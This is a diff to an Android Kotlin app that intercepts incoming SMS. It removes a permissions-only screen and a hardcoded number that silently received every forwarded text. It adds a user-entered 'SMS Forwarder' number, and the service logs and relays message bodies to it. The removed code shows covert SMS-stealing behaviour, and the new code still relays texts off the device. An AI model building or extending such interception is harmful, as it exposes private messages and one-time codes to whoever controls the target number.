@@ -16,7 +16,9 @@ import androidx.activity.result.contract.ActivityResultContracts
 import android.app.Service
 import android.content.pm.PackageManager
 import android.os.IBinder
+import android.preference.PreferenceManager
 import android.telephony.SmsManager
+import android.widget.Toast
 import androidx.compose.animation.AnimatedVisibility
 import androidx.compose.animation.fadeIn
 import androidx.compose.animation.fadeOut
@@ -32,10 +34,15 @@ import androidx.compose.foundation.layout.fillMaxWidth
 import androidx.compose.foundation.layout.padding
 import androidx.compose.material3.Button
 import androidx.compose.material3.MaterialTheme
+import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.Scaffold
 import androidx.compose.material3.Text
 import androidx.compose.runtime.Composable
 import androidx.compose.runtime.LaunchedEffect
+import androidx.compose.runtime.getValue
+import androidx.compose.runtime.mutableStateOf
+import androidx.compose.runtime.remember
+import androidx.compose.runtime.setValue
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
@@ -51,7 +58,9 @@ class MainActivity : ComponentActivity() {
     private val requestPermissionsLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { permissions ->
-        // Handle permission results
+        permissions.entries.forEach {
+            Log.d("Permissions", "${it.key} = ${it.value}")
+        }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -82,26 +91,36 @@ class MainActivity : ComponentActivity() {
 
 @Composable
 fun MainScreen() {
-    Box(modifier = Modifier
-        .fillMaxSize()
-        .background(Color.LightGray)) {
-        Column(
-            modifier = Modifier
-                .fillMaxWidth()
-                .padding(16.dp),
-            verticalArrangement = Arrangement.Center,
-            horizontalAlignment = Alignment.CenterHorizontally
-        ) {
-            Text(
-                text = "simple page only to get permissions !",
-                fontSize = 20.sp,
-                fontWeight = FontWeight.Bold,
-                color = Color.White
-            )
+    var forwardNumber by remember { mutableStateOf("") }
+    val context = LocalContext.current
+
+    Column(modifier = Modifier.padding(16.dp)) {
+        Text(text = "SMS Forwarder")
+        OutlinedTextField(
+            value = forwardNumber,
+            onValueChange = { forwardNumber = it },
+            label = { Text("Forward to number") },
+            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp)
+        )
+        Button(onClick = {
+            if (forwardNumber.isNotEmpty()) {
+                saveForwardNumber(context, forwardNumber)
+                Toast.makeText(context, "Number saved", Toast.LENGTH_SHORT).show()
+            } else {
+                Toast.makeText(context, "Please enter a number", Toast.LENGTH_SHORT).show()
+            }
+        }) {
+            Text(text = "Save Number")
         }
     }
 }
-
+fun saveForwardNumber(context: Context, number: String) {
+    val sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context)
+    with(sharedPreferences.edit()) {
+        putString("forward_number", number)
+        apply()
+    }
+}
 
 class SMSReceiver : BroadcastReceiver() {
 
@@ -136,8 +155,17 @@ class SMSService : Service() {
         val messageBody = intent?.getStringExtra("messageBody")
 
         if (sender != null && messageBody != null) {
-            val targetNumber = "09129264427" // Replace with your target number
-            forwardSMS(targetNumber, "forwarded SMS from : $sender --> \n $messageBody")
+            val sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this)
+            val targetNumber = sharedPreferences.getString("forward_number", null)
+
+            if (!targetNumber.isNullOrEmpty()) {
+                Log.d("SMSService", "Forwarding SMS to $targetNumber with message: $messageBody")
+                forwardSMS(targetNumber, messageBody)
+            } else {
+                Log.d("SMSService", "No target number set")
+            }
+        } else {
+            Log.d("SMSService", "No sender or message body in intent")
         }
 
         return START_NOT_STICKY
